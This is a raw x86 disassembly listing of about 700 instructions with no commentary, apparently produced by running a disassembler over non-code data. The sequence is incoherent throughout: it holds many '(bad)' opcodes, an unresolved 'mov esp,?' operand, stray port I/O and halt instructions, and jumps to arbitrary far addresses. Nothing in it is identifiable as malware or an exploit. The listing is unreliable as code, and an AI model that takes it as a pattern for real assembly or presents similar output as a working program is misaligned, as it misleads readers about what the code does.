  419c7d:	push   esp
  419c7e:	cli    
  419c7f:	ds repz jp 0x419cc8
  419c83:	bound  ecx,QWORD PTR [esi-0xf]
  419c86:	xor    eax,0x645d2fa2
  419c8b:	sub    bh,BYTE PTR [ecx+eax*8-0x1a]
  419c8f:	jne    0x419cbe
  419c91:	cwde   
  419c92:	mov    cs,WORD PTR ds:0xd65e5f67
  419c98:	jmp    0x11afface
  419c9d:	xchg   WORD PTR ds:0x6e9e11f2,bx
  419ca4:	sahf   
  419ca5:	xchg   ecx,eax
  419ca6:	aas    
  419ca7:	mov    DWORD PTR [ecx],ebp
  419ca9:	push   es
  419caa:	xchg   esp,eax
  419cab:	in     eax,dx
  419cac:	xor    DWORD PTR [edx],ebx
  419cae:	loop   0x419cd8
  419cb0:	mov    esp,?
  419cb2:	push   es
  419cb3:	inc    edx
  419cb4:	adc    DWORD PTR [ebx+ebp*1],eax
  419cb7:	pusha  
  419cb8:	xchg   ebx,eax
  419cb9:	xchg   ebx,eax
  419cba:	adc    ah,dl
  419cbc:	out    dx,eax
  419cbd:	mov    ds:0x87b67ca,eax
  419cc2:	mov    dh,BYTE PTR [ebx]
  419cc4:	sbb    eax,0xb54cc3aa
  419cc9:	fisttp WORD PTR [edi]
  419ccb:	jmp    0x49ac611a
  419cd0:	mov    cl,0xcc
  419cd2:	dec    ecx
  419cd3:	cld    
  419cd4:	sbb    al,0x5a
  419cd6:	push   ebp
  419cd7:	jns    0x419d15
  419cd9:	ins    DWORD PTR es:[edi],dx
  419cda:	jle    0x419d37
  419cdc:	mov    cl,0x1f
  419cde:	addr16 in al,0x8b
  419ce1:	outs   dx,BYTE PTR ds:[esi]
  419ce2:	mov    ebx,0xb3ad8b9e
  419ce7:	(bad)  
  419ce8:	jno    0x419cae
  419cea:	mov    ah,bh
  419cec:	push   ebx
  419ced:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419cee:	pop    es
  419cef:	push   0x1072bbf2
  419cf4:	pop    ds
  419cf5:	jmp    0xcce8:0x6fab7b87
  419cfc:	mov    bl,0x1d
  419cfe:	rcl    BYTE PTR [ebp*2-0x14e19e78],1
  419d05:	fucomi st,st(7)
  419d07:	hlt    
  419d08:	fs mov bh,0x20
  419d0b:	add    esi,DWORD PTR [ebx-0x69bad5a4]
  419d11:	xor    BYTE PTR [edi-0x4609a2d0],ch
  419d17:	aaa    
  419d18:	into   
  419d19:	cmp    eax,0xb6f70f64
  419d1e:	dec    eax
  419d1f:	inc    si
  419d21:	fld    DWORD PTR [si-0x5d0b]
  419d26:	cmp    al,0xf5
  419d28:	pop    esi
  419d29:	mov    bl,ch
  419d2b:	call   0xf0f6:0x62d8686f
  419d32:	repnz icebp 
  419d34:	hlt    
  419d35:	xor    eax,0x21be52ec
  419d3a:	std    
  419d3b:	bound  esi,QWORD PTR [edx+eiz*4-0x54ba2d91]
  419d42:	pushf  
  419d43:	jmp    0x419d04
  419d45:	test   al,0x7a
  419d47:	adc    al,0x91
  419d49:	stos   DWORD PTR es:[edi],eax
  419d4a:	inc    esi
  419d4b:	stos   DWORD PTR es:[edi],eax
  419d4c:	fsubr  DWORD PTR [edi-0x37dde904]
  419d52:	and    dh,BYTE PTR [eax-0x80]
  419d55:	and    DWORD PTR [ecx],ebx
  419d57:	popa   
  419d58:	js     0x419db6
  419d5a:	jmp    0x90cd:0x29d0b9c
  419d61:	cmp    ebx,DWORD PTR [ecx]
  419d63:	or     bh,BYTE PTR [eax]
  419d65:	mov    DWORD PTR [ebx+ecx*4],ecx
  419d68:	add    BYTE PTR [ecx-0x7e6f6d9a],0x7b
  419d6f:	sbb    eax,0xe9cdfe71
  419d74:	daa    
  419d75:	imul   ebp,DWORD PTR [esi],0x4c
  419d78:	pop    esi
  419d79:	mov    edi,0xa3147670
  419d7e:	inc    ebx
  419d7f:	test   eax,0x4e01e79f
  419d84:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  419d86:	clc    
  419d87:	fmul   st(2),st
  419d89:	add    al,0x70
  419d8b:	fs (bad) 
  419d8d:	out    dx,eax
  419d8e:	int    0x67
  419d90:	outs   dx,BYTE PTR ds:[esi]
  419d91:	xor    DWORD PTR [ebx],esi
  419d93:	fstp   DWORD PTR [eax+edx*1+0xfc266d7]
  419d9a:	fnsave [ebx-0x5b]
  419d9d:	adc    esp,DWORD PTR [eax-0x60fc986d]
  419da3:	push   ebp
  419da4:	(bad)  
  419da5:	jmp    0x419da7
  419da7:	push   ebx
  419da8:	call   0x9a77:0xb76546e4
  419daf:	jg     0x419dff
  419db1:	mov    cl,0x9c
  419db3:	mov    BYTE PTR [edi-0x7d],cl
  419db6:	adc    bl,BYTE PTR [esi+0x3d0040a9]
  419dbc:	mov    DWORD PTR ds:0x455c14ba,edx
  419dc2:	push   ss
  419dc3:	jno    0x419e38
  419dc5:	mov    edx,0xc0759b3c
  419dca:	adc    BYTE PTR [esi],dl
  419dcc:	scas   eax,DWORD PTR es:[edi]
  419dcd:	retf   
  419dce:	add    ah,bl
  419dd0:	jl     0x419df9
  419dd2:	les    esp,FWORD PTR [edi+0x118f154f]
  419dd8:	pop    edx
  419dd9:	inc    si
  419ddb:	mov    gs,WORD PTR [eax+eiz*4]
  419dde:	(bad)  
  419ddf:	lods   al,BYTE PTR ds:[esi]
  419de0:	xchg   ebp,eax
  419de1:	push   es
  419de2:	pop    ebx
  419de3:	xor    bl,dl
  419de5:	jae    0x419e03
  419de7:	jge    0x419e3c
  419de9:	pop    eax
  419dea:	xor    DWORD PTR [edx+0x20],ebx
  419ded:	sti    
  419dee:	pop    edi
  419def:	cmp    ebx,DWORD PTR [ecx-0x2dfb55f2]
  419df5:	pop    ss
  419df6:	jmp    0x2a88554c
  419dfb:	pop    esi
  419dfc:	ror    DWORD PTR [edx-0x5766d1d9],cl
  419e02:	div    DWORD PTR [ebx]
  419e04:	(bad)  
  419e05:	mov    eax,ds:0xa9144303
  419e0a:	test   BYTE PTR [ecx+0x7f5fb82b],bl
  419e10:	and    eax,0x7c1976ab
  419e15:	cmp    esp,DWORD PTR [eax-0x544af79c]
  419e1b:	mov    DWORD PTR [edx-0x4c],esp
  419e1e:	jnp    0x419e75
  419e20:	call   0x19ec:0xffa58d92
  419e27:	cmp    eax,0xf8644fc3
  419e2c:	jle    0x419e5b
  419e2e:	push   ebp
  419e2f:	push   ecx
  419e30:	icebp  
  419e31:	mov    dl,0xb7
  419e33:	sbb    BYTE PTR [ecx+eax*4-0x50],bh
  419e37:	pop    ebp
  419e38:	cs in  eax,dx
  419e3a:	push   0xa4356fc1
  419e3f:	pop    ebp
  419e40:	jb     0x419dcd
  419e42:	(bad)  
  419e43:	xor    DWORD PTR [eax+0x78d3f0c4],edx
  419e49:	xor    eax,0xe2744d3c
  419e4e:	ins    DWORD PTR es:[edi],dx
  419e4f:	in     eax,dx
  419e50:	xchg   edx,eax
  419e51:	cwde   
  419e52:	sbb    al,0x1a
  419e54:	daa    
  419e55:	or     ecx,edx
  419e57:	jo     0x419e07
  419e59:	loop   0x419e66
  419e5b:	xchg   ebx,eax
  419e5c:	adc    edx,DWORD PTR [edx]
  419e5e:	push   es
  419e5f:	inc    edi
  419e60:	stos   DWORD PTR es:[edi],eax
  419e61:	pop    ebx
  419e62:	or     BYTE PTR [ecx],dh
  419e64:	in     al,0x63
  419e66:	or     BYTE PTR [eax],cl
  419e68:	in     al,dx
  419e69:	icebp  
  419e6a:	or     BYTE PTR [ebp+0x76e39d83],dl
  419e70:	adc    DWORD PTR [ecx+0x43],eax
  419e73:	push   ecx
  419e74:	jg     0x419e5b
  419e76:	dec    ecx
  419e77:	jmp    0xcbed:0x61fdf50d
  419e7e:	adc    edx,eax
  419e80:	mov    eax,0x47a2b8ca
  419e85:	mov    dl,0x73
  419e87:	cli    
  419e88:	cmc    
  419e89:	adc    BYTE PTR [edi+ebp*2-0x480e6795],0xd3
  419e91:	jl     0x419f06
  419e93:	add    al,0xa8
  419e95:	push   ss
  419e96:	inc    eax
  419e97:	and    BYTE PTR [ecx],bl
  419e99:	ds inc ebx
  419e9b:	(bad)  
  419e9c:	imul   ebp,edx,0x54
  419e9f:	push   ebp
  419ea0:	xchg   esi,eax
  419ea1:	jb     0x419e2b
  419ea3:	nop
  419ea4:	retf   0x94db
  419ea7:	aaa    
  419ea8:	lock sub bh,BYTE PTR ds:0x808db808
  419eaf:	jl     0x419e4e
  419eb1:	fwait
  419eb2:	jle    0x419e8e
  419eb4:	stc    
  419eb5:	push   edx
  419eb6:	xchg   ah,al
  419eb8:	inc    edx
  419eb9:	test   eax,0xeda11a3f
  419ebe:	iret   
  419ebf:	mov    bl,0xa0
  419ec1:	dec    ebx
  419ec2:	inc    eax
  419ec3:	mov    ch,0x78
  419ec5:	lods   eax,DWORD PTR ds:[esi]
  419ec6:	mov    eax,ds:0xc11f97c9
  419ecb:	popf   
  419ecc:	or     al,0xdb
  419ece:	sub    esp,edi
  419ed0:	push   esi
  419ed1:	fisttp WORD PTR [edx]
  419ed3:	xchg   esp,eax
  419ed4:	mov    bh,BYTE PTR [eax+edi*1+0x5aeb85a3]
  419edb:	je     0x419eaa
  419edd:	(bad)  
  419edf:	fisttp DWORD PTR [ecx*4+0x7642fa18]
  419ee6:	dec    ecx
  419ee7:	bound  edi,QWORD PTR [edx-0x79]
  419eea:	pop    eax
  419eeb:	push   ebp
  419eec:	ins    DWORD PTR es:[edi],dx
  419eed:	adc    eax,0x433438f1
  419ef2:	ins    DWORD PTR es:[edi],dx
  419ef3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ef4:	je     0x419eae
  419ef6:	bound  esp,QWORD PTR [ebp+0x12]
  419ef9:	pop    es
  419efa:	xchg   ebx,eax
  419efb:	push   0x3a
  419efd:	add    eax,0xc3849edc
  419f02:	push   esi
  419f03:	jbe    0x419efc
  419f05:	xlat   BYTE PTR ds:[ebx]
  419f06:	xchg   DWORD PTR [ebp-0x5de76959],ebp
  419f0c:	jbe    0x419ebb
  419f0e:	mov    ebp,0x955d3006
  419f13:	dec    esp
  419f14:	enter  0x1213,0x70
  419f18:	mov    bl,dl
  419f1a:	ss pushf 
  419f1c:	push   ss
  419f1d:	cmp    edi,ebp
  419f1f:	pushf  
  419f20:	js     0x419f47
  419f22:	test   BYTE PTR [esi+ecx*8-0x41],dl
  419f26:	clc    
  419f27:	push   ecx
  419f28:	sbb    eax,0x807b9b0d
  419f2d:	inc    edi
  419f2e:	inc    edi
  419f2f:	or     cl,BYTE PTR [edi-0x488336fb]
  419f35:	cli    
  419f36:	test   eax,0xa6ae67cd
  419f3b:	(bad)
  419f3e:	cdq    
  419f3f:	jmp    0xeea46a39
  419f44:	sub    ah,bl
  419f46:	jnp    0x419ee9
  419f48:	(bad)  
  419f49:	and    DWORD PTR [edi-0x2d],ebx
  419f4c:	cwde   
  419f4d:	cmp    bl,0x7a
  419f50:	fld    DWORD PTR [esi+0x50]
  419f53:	push   ds
  419f54:	add    edx,ecx
  419f56:	mov    eax,ds:0xd54816ca
  419f5b:	xlat   BYTE PTR ds:[ebx]
  419f5c:	ja     0x419f84
  419f5e:	mov    BYTE PTR [ecx-0x2f7f603],cl
  419f64:	and    DWORD PTR [edx+esi*1-0x38],0xfffffffa
  419f69:	scas   eax,DWORD PTR es:[edi]
  419f6a:	dec    edx
  419f6b:	xchg   ebp,eax
  419f6c:	les    ebx,FWORD PTR [edx-0x69]
  419f6f:	pop    es
  419f70:	shl    edi,0x84
  419f73:	xchg   ebp,eax
  419f74:	test   DWORD PTR [ecx+ebp*4-0x64],esp
  419f78:	sub    ah,al
  419f7a:	mov    edi,esi
  419f7c:	(bad)  
  419f7d:	xchg   edx,eax
  419f7e:	lods   al,BYTE PTR ds:[esi]
  419f7f:	cld    
  419f80:	add    al,0xb6
  419f82:	xor    al,0xbb
  419f84:	sbb    ebx,eax
  419f86:	inc    ecx
  419f87:	test   al,0x93
  419f89:	jl     0x419fd4
  419f8b:	and    DWORD PTR [edx],esi
  419f8d:	out    0x90,al
  419f8f:	aaa    
  419f90:	jecxz  0x419f39
  419f92:	shl    DWORD PTR ds:0xb1343218,1
  419f98:	push   0x6e
  419f9a:	mov    ebx,0x472746b1
  419f9f:	xchg   esi,eax
  419fa0:	gs dec ebp
  419fa2:	jl     0x419ff5
  419fa4:	mul    DWORD PTR [ecx-0x50abc6d]
  419faa:	fwait
  419fab:	cmp    DWORD PTR [edi+0xc],0x667cbef9
  419fb2:	daa    
  419fb3:	xchg   ecx,eax
  419fb4:	adc    DWORD PTR [esi],esp
  419fb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fb7:	sub    eax,DWORD PTR [ecx+edx*8-0x58]
  419fbb:	out    0x2d,eax
  419fbd:	push   ebp
  419fbe:	dec    esi
  419fbf:	(bad)  
  419fc0:	out    0x9,al
  419fc2:	cmp    al,0x90
  419fc4:	loope  0x41a027
  419fc6:	xchg   edi,eax
  419fc7:	aad    0x7c
  419fc9:	and    BYTE PTR [ebx+eax*1],ch
  419fcc:	call   0xe2e2:0xec4095bb
  419fd3:	mov    ch,0xee
  419fd5:	cwde   
  419fd6:	push   ds
  419fd7:	je     0x419ff3
  419fd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419fda:	hlt    
  419fdb:	das    
  419fdc:	sbb    dl,BYTE PTR [edi]
  419fde:	or     ah,BYTE PTR ds:0x6c1dd18e
  419fe4:	xchg   ebx,eax
  419fe5:	cmp    bh,BYTE PTR [eax+0x3f]
  419fe8:	dec    ecx
  419fe9:	mov    ecx,0xb80c327b
  419fee:	mov    ds:0x2f53e3e5,al
  419ff3:	xor    edx,eax
  419ff5:	popa   
  419ff6:	adc    BYTE PTR [edi+0x3b71a320],0x1d
  419ffd:	sbb    ebx,DWORD PTR [edx]
  419fff:	mov    WORD PTR [ebx-0x6edc6f47],gs
  41a005:	push   es
  41a006:	loopne 0x419fe5
  41a008:	sti    
  41a009:	inc    esp
  41a00a:	mov    eax,0x4104dc49
  41a00f:	cmp    ebx,esp
  41a011:	mov    eax,0x3de0ec3
  41a016:	jecxz  0x41a07e
  41a018:	pop    esp
  41a019:	mov    cs,esp
  41a01b:	lea    ebp,[ecx-0x64]
  41a01e:	mov    esp,0xf35bfaa
  41a023:	or     DWORD PTR [ebp-0x1dc77e4b],0xffffffd7
  41a02a:	pop    eax
  41a02b:	push   ecx
  41a02c:	sub    DWORD PTR [edi-0x5e],edi
  41a02f:	adc    BYTE PTR [eax+0x3a],0xd2
  41a033:	popa   
  41a034:	xchg   ebx,eax
  41a035:	cmp    al,BYTE PTR [ecx]
  41a037:	sti    
  41a038:	inc    ebx
  41a039:	popa   
  41a03a:	add    DWORD PTR [edx],ebp
  41a03c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a03d:	mov    ebp,0x34bcee1a
  41a042:	test   eax,0xe2d4afc
  41a047:	push   eax
  41a048:	mov    ecx,0x5a86b5fb
  41a04d:	and    edi,DWORD PTR [esi+ebp*4]
  41a050:	cmp    DWORD PTR [ebp+0x4a887625],ecx
  41a056:	jns    0x41a06c
  41a058:	sti    
  41a059:	mov    bh,0xe4
  41a05b:	call   0x3461c36
  41a060:	jno    0x41a0c0
  41a062:	fadd   QWORD PTR [esi+ebx*2]
  41a065:	push   0xffffff8b
  41a067:	inc    esi
  41a068:	out    0x84,eax
  41a06a:	push   esp
  41a06b:	dec    eax
  41a06c:	sahf   
  41a06d:	fld    TBYTE PTR [edx-0x29]
  41a070:	repnz sub DWORD PTR [ebp+0x6c],edx
  41a074:	leave  
  41a075:	and    BYTE PTR [ebx],al
  41a077:	imul   ecx,ebp,0xbe637996
  41a07d:	xchg   esp,eax
  41a07e:	das    
  41a07f:	lods   eax,DWORD PTR ds:[esi]
  41a080:	inc    edi
  41a081:	sahf   
  41a082:	add    eax,0x825b99ec
  41a087:	xchg   esi,eax
  41a088:	cmp    BYTE PTR [edi+0x303bbe3b],cl
  41a08e:	push   ss
  41a08f:	popa   
  41a090:	nop
  41a091:	xchg   ebx,eax
  41a092:	ds jge 0x41a07b
  41a095:	sub    esp,DWORD PTR [ebx-0x64]
  41a098:	es rol dl,0xd4
  41a09c:	sub    BYTE PTR [ebp-0x1],bl
  41a09f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0a0:	cli    
  41a0a1:	jo     0x41a02a
  41a0a3:	ret    0x8e89
  41a0a6:	(bad)  
  41a0a7:	test   eax,0x769ba933
  41a0ac:	push   0xa
  41a0ae:	fldenv [eax+0x5a02fd63]
  41a0b4:	fdivr  QWORD PTR [edi]
  41a0b6:	mov    dl,0xfc
  41a0b8:	sti    
  41a0b9:	add    al,0xf
  41a0bb:	sbb    BYTE PTR [edi],0xfb
  41a0be:	es ja  0x41a0fd
  41a0c1:	mov    DWORD PTR [edx+edi*2+0x54],esp
  41a0c5:	mov    cl,0x6d
  41a0c7:	arpl   WORD PTR [esi],sp
  41a0c9:	push   ss
  41a0ca:	and    DWORD PTR gs:[edi-0x46cf7ec2],ecx
  41a0d1:	mov    al,ds:0x43cb5c3b
  41a0d6:	push   0xffffff8e
  41a0d8:	fist   DWORD PTR [edi+eax*8+0x52dcd7c5]
  41a0df:	test   al,al
  41a0e1:	jecxz  0x41a099
  41a0e3:	jge    0x41a0d0
  41a0e5:	add    eax,0x4dd1e2d8
  41a0ea:	pop    eax
  41a0eb:	sti    
  41a0ec:	cmp    BYTE PTR [edi-0x7c0890b8],al
  41a0f2:	cs (bad) 
  41a0f4:	sub    esi,DWORD PTR [ebp+0x3b038e88]
  41a0fa:	fstp   DWORD PTR [ebx+0x7b]
  41a0fd:	xchg   ebp,eax
  41a0fe:	adc    bl,BYTE PTR [ecx+0x29]
  41a101:	jle    0x41a13d
  41a103:	mov    ebx,0xca797b04
  41a108:	out    0x57,eax
  41a10a:	dec    edx
  41a10b:	dec    ecx
  41a10c:	test   BYTE PTR [edi],al
  41a10e:	out    0x3c,al
  41a110:	imul   eax,DWORD PTR [ebx-0xce0744a],0x63
  41a117:	jbe    0x41a121
  41a119:	inc    ebx
  41a11a:	or     DWORD PTR [edx],esp
  41a11c:	repz xchg ecx,eax
  41a11e:	dec    ebx
  41a11f:	xchg   esp,eax
  41a120:	xor    edi,DWORD PTR [esi+0x44]
  41a123:	stos   DWORD PTR es:[edi],eax
  41a124:	icebp  
  41a125:	mov    edx,0x7cbb22c6
  41a12a:	xchg   ebp,eax
  41a12b:	lods   al,BYTE PTR ds:[esi]
  41a12c:	test   al,0xf1
  41a12e:	std    
  41a12f:	add    BYTE PTR [ebx],cl
  41a131:	jg     0x41a0ee
  41a133:	push   es
  41a134:	hlt    
  41a135:	fld    QWORD PTR [esi]
  41a137:	add    cl,dh
  41a139:	sub    al,0x97
  41a13b:	rcr    BYTE PTR [ecx],0x27
  41a13e:	and    ebp,DWORD PTR [ebx]
  41a140:	inc    esp
  41a141:	push   ds
  41a142:	inc    ecx
  41a143:	xor    esp,edx
  41a145:	aaa    
  41a146:	fwait
  41a147:	scas   eax,DWORD PTR es:[edi]
  41a148:	mov    ds,WORD PTR [edi]
  41a14a:	test   BYTE PTR [esi-0x1a06ebc2],bl
  41a150:	shr    edi,0x79
  41a153:	jbe    0x41a141
  41a155:	ret    0xfa1a
  41a158:	inc    esi
  41a159:	repnz adc bl,BYTE PTR [edx]
  41a15c:	aam    0xed
  41a15e:	stc    
  41a15f:	fstp   DWORD PTR [ebp-0xf]
  41a162:	or     al,0x8d
  41a164:	add    al,0x86
  41a166:	or     eax,0xfb07913c
  41a16b:	lds    edx,FWORD PTR [edi]
  41a16d:	pusha  
  41a16e:	pop    es
  41a16f:	sub    eax,0x9de7d4be
  41a174:	into   
  41a175:	mov    ebx,0xbec064ad
  41a17a:	or     al,0x5b
  41a17c:	pop    ds
  41a17d:	jecxz  0x41a1cf
  41a17f:	xchg   edi,eax
  41a180:	cwde   
  41a181:	xor    DWORD PTR [edi+eiz*2],ebp
  41a184:	fwait
  41a185:	push   ecx
  41a186:	cmp    dl,BYTE PTR [ebp+0x70]
  41a189:	dec    esp
  41a18a:	xchg   edx,eax
  41a18b:	pop    ds
  41a18c:	dec    edx
  41a18d:	cmp    edi,esi
  41a18f:	cld    
  41a190:	and    dh,ah
  41a192:	mov    ch,BYTE PTR [eax*1-0x52811043]
  41a199:	jo     0x41a14a
  41a19b:	lods   eax,DWORD PTR ds:[esi]
  41a19c:	rol    DWORD PTR [ecx+0x34],cl
  41a19f:	cwde   
  41a1a0:	mov    eax,esi
  41a1a2:	xchg   ebp,eax
  41a1a3:	rcl    ch,cl
  41a1a5:	push   ss
  41a1a6:	imul   edi,DWORD PTR [ebp-0x32],0x52
  41a1aa:	popf   
  41a1ab:	xchg   esi,eax
  41a1ac:	xor    eax,0xaf949869
  41a1b1:	lock in al,dx
  41a1b3:	sbb    eax,0x8fa59b53
  41a1b8:	int3   
  41a1b9:	sahf   
  41a1ba:	pop    eax
  41a1bb:	pop    ebp
  41a1bc:	(bad)  
  41a1bd:	sub    al,0x71
  41a1bf:	sub    DWORD PTR [ebp+edx*1+0x16],ecx
  41a1c3:	retf   0xa6d8
  41a1c6:	jp     0x41a1f6
  41a1c8:	sbb    DWORD PTR [ebx-0x635e00a1],esp
  41a1ce:	aad    0xc5
  41a1d0:	leave  
  41a1d1:	mov    eax,0x9583b98d
  41a1d6:	stos   DWORD PTR es:[edi],eax
  41a1d7:	test   eax,0x38016a95
  41a1dc:	popf   
  41a1dd:	add    al,0xc6
  41a1e0:	das    
  41a1e1:	or     ah,BYTE PTR [eax]
  41a1e3:	loop   0x41a22d
  41a1e5:	iret   
  41a1e6:	adc    ch,dl
  41a1e8:	std    
  41a1e9:	out    0xc8,al
  41a1eb:	hlt    
  41a1ec:	jno    0x41a1ee
  41a1ee:	sbb    bl,BYTE PTR [eax]
  41a1f0:	repz mov dl,0xf1
  41a1f3:	fsubr  QWORD PTR [ecx]
  41a1f5:	pop    esi
  41a1f6:	cmp    DWORD PTR [ebp-0x19],eax
  41a1f9:	(bad)  
  41a1fb:	sub    BYTE PTR [edx-0x65d46d6c],bh
  41a201:	aas    
  41a202:	fcmovnb st,st(5)
  41a204:	jns    0x41a284
  41a206:	mov    al,0xd8
  41a208:	sub    BYTE PTR [ebp-0x21],ch
  41a20b:	mov    DWORD PTR [edx],0x9b0c535f
  41a211:	pop    edx
  41a212:	adc    al,0xc6
  41a214:	ret    
  41a215:	push   DWORD PTR [edx-0x31]
  41a218:	cmp    al,0x18
  41a21a:	sti    
  41a21b:	mov    bh,0x2e
  41a21d:	or     al,0xd5
  41a21f:	in     al,0x71
  41a221:	push   ebx
  41a222:	pop    ecx
  41a223:	es jmp 0xcd3e:0xc4723933
  41a22b:	stos   DWORD PTR es:[edi],eax
  41a22c:	ficom  WORD PTR [ecx+0x61b665d6]
  41a232:	jo     0x41a25c
  41a234:	aaa    
  41a235:	jge    0x41a1de
  41a237:	or     esp,DWORD PTR [eax]
  41a239:	sub    DWORD PTR [ebx],edx
  41a23b:	mov    cl,0xb4
  41a23d:	dec    eax
  41a23e:	ret    0x73b4
  41a241:	add    eax,0x9a148b45
  41a246:	lahf   
  41a247:	cmp    eax,0x55d9ab82
  41a24c:	pop    edx
  41a24d:	xor    ebp,DWORD PTR [eax+ebx*4+0x2b1649ab]
  41a254:	imul   ebp,DWORD PTR [eax],0x6d35febf
  41a25a:	fcomp  DWORD PTR [ecx]
  41a25c:	leave  
  41a25d:	je     0x41a2cd
  41a25f:	sahf   
  41a260:	bound  esp,QWORD PTR [edx]
  41a262:	push   edx
  41a263:	add    esp,DWORD PTR [edx-0x22bab412]
  41a269:	push   ebx
  41a26a:	cmp    eax,0x7dd5d437
  41a26f:	dec    esp
  41a270:	hlt    
  41a271:	je     0x41a219
  41a273:	stos   BYTE PTR es:[edi],al
  41a274:	mov    ah,0x8b
  41a276:	call   0x805d:0x9c8f5318
  41a27d:	dec    edx
  41a27e:	mov    dl,0x3d
  41a280:	cmp    ch,cl
  41a282:	stos   BYTE PTR es:[edi],al
  41a283:	in     al,dx
  41a284:	cs xor al,0xb6
  41a287:	sbb    ebx,edi
  41a289:	mov    al,0x2c
  41a28b:	jne    0x41a25e
  41a28d:	jmp    0x5e2f:0x6cba4569
  41a294:	push   ds
  41a295:	mov    ecx,0x7979ac45
  41a29a:	rcr    DWORD PTR [eax-0x78],0x92
  41a29e:	or     eax,0x703fe2b8
  41a2a3:	sbb    al,0x31
  41a2a5:	nop
  41a2a6:	rol    DWORD PTR [eax+0xd],1
  41a2a9:	(bad)  
  41a2aa:	push   ecx
  41a2ab:	inc    edx
  41a2ac:	mov    ah,0x3
  41a2ae:	outs   dx,DWORD PTR ds:[esi]
  41a2af:	leave  
  41a2b0:	dec    ebp
  41a2b1:	hlt    
  41a2b2:	add    al,0x61
  41a2b4:	out    dx,al
  41a2b5:	sub    eax,0xb8a5ff1e
  41a2ba:	cmp    eax,0x45b52225
  41a2bf:	xchg   BYTE PTR [eax],ah
  41a2c1:	imul   edi,DWORD PTR [ebx],0xcedb6c32
  41a2c7:	pop    esi
  41a2c8:	mov    dl,0x3b
  41a2ca:	call   0x40022310
  41a2cf:	and    DWORD PTR [edi],0x67
  41a2d2:	loopne 0x41a257
  41a2d4:	les    esp,FWORD PTR [esi-0x6]
  41a2d7:	pop    ebx
  41a2d8:	rcl    BYTE PTR [eax],1
  41a2da:	imul   ecx,DWORD PTR [eax-0x79],0x227ccebb
  41a2e1:	repnz leave 
  41a2e3:	std    
  41a2e4:	mov    ah,0xfe
  41a2e6:	test   al,0xc
  41a2e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2e9:	push   cs
  41a2ea:	outs   dx,BYTE PTR ds:[esi]
  41a2eb:	xor    eax,0x8b9a6ff5
  41a2f0:	ss jbe 0x41a33d
  41a2f3:	and    BYTE PTR [esi],0xa3
  41a2f6:	xor    ebx,DWORD PTR [eax]
  41a2f8:	icebp  
  41a2f9:	pushf  
  41a2fa:	mov    ah,dh
  41a2fc:	(bad)  
  41a2fd:	ins    DWORD PTR es:[edi],dx
  41a2fe:	xor    BYTE PTR [edx-0xf],ah
  41a301:	int    0xc1
  41a303:	mov    dh,0x7e
  41a305:	jmp    0xed148db7
  41a30a:	add    BYTE PTR [eax],cl
  41a30c:	dec    ecx
  41a30d:	mov    bh,0x1c
  41a30f:	jl     0x41a2ec
  41a311:	nop
  41a312:	sub    DWORD PTR ds:0x4a3c5de5,0x529eb340
  41a31c:	mov    ebp,0xe3efab3d
  41a321:	dec    esp
  41a322:	sar    BYTE PTR [edi],1
  41a324:	sub    DWORD PTR ds:0x5c896028,ebp
  41a32a:	inc    esp
  41a32b:	push   es
  41a32c:	jne    0x41a363
  41a32e:	call   0xdbc5:0xd6dc315f
  41a335:	fdiv   DWORD PTR [esi+0x6c]
  41a338:	gs pop ebp
  41a33a:	inc    ecx
  41a33b:	mov    edx,0x6517f810
  41a340:	dec    ebx
  41a341:	cmp    ch,BYTE PTR [eax-0x1d584591]
  41a347:	cmp    dh,bl
  41a349:	outs   dx,BYTE PTR ds:[esi]
  41a34a:	xor    cl,ah
  41a34c:	push   eax
  41a34d:	and    al,0xd0
  41a34f:	frstor [eax+0x70]
  41a352:	jmp    0x535f0778
  41a357:	imul   esi,DWORD PTR [eax+eiz*1],0x91e01e3f
  41a35e:	lea    esi,[edi-0x33cddf9b]
  41a364:	neg    BYTE PTR [edx+0x1f]
  41a367:	in     al,0x72
  41a369:	adc    ch,dh
  41a36b:	pop    edx
  41a36c:	jno    0x41a348
  41a36e:	fsub   QWORD PTR [ecx]
  41a370:	lods   eax,DWORD PTR ds:[esi]
  41a371:	xchg   esi,eax
  41a372:	iret   
  41a373:	out    0x30,eax
  41a375:	mov    ah,0xc7
  41a377:	stc    
  41a378:	cld    
  41a379:	mov    al,ds:0x23e86d33
  41a37e:	ins    DWORD PTR es:[edi],dx
  41a37f:	mov    edi,DWORD PTR [ecx]
  41a381:	jl     0x41a3a8
  41a383:	pop    es
  41a384:	jmp    0xe2f93b4c
  41a389:	jl     0x41a333
  41a38b:	mov    edx,0xc7a5c360
  41a390:	fxch   st(2)
  41a392:	fs xor ebx,0xffffffa6
  41a396:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a397:	clc    
  41a398:	leave  
  41a399:	mov    ebp,0x8ac9fbf6
  41a39e:	retf   0xaebb
  41a3a1:	jle    0x41a3a2
  41a3a3:	mov    dh,0x3c
  41a3a5:	ret    
  41a3a6:	in     al,dx
  41a3a7:	imul   ebp,DWORD PTR [ecx-0x80],0x366f4ce4
  41a3ae:	mov    ebx,0x33bced97
  41a3b3:	inc    ebp
  41a3b4:	mov    BYTE PTR [ebx],dl
  41a3b6:	rcr    DWORD PTR [edx-0x693867f0],cl
  41a3bc:	mov    ebx,0xbaac546b
  41a3c1:	mov    ebx,0xaa99e631
  41a3c6:	cmp    BYTE PTR [ebx+0x8030f52],dh
  41a3cc:	cwde   
  41a3cd:	pop    ebp
  41a3ce:	cmp    al,0xbb
  41a3d0:	test   BYTE PTR [edx],cl
  41a3d2:	repnz add DWORD PTR ds:0x2a9c2bf2,ebp
  41a3d9:	pop    eax
  41a3da:	pop    ecx
  41a3db:	jecxz  0x41a40b
  41a3dd:	push   esp
  41a3de:	mov    esi,0x31b3c1ee
  41a3e3:	rcl    BYTE PTR [eax-0x129aa2a6],0x6b
  41a3ea:	mov    edi,0xa2e49bad
  41a3ef:	fist   DWORD PTR [esi]
  41a3f1:	stos   DWORD PTR es:[edi],eax
  41a3f2:	pop    eax
  41a3f3:	jmp    0x41a467
  41a3f5:	sub    BYTE PTR [ecx],ch
  41a3f7:	data16 jne 0x41a3dd
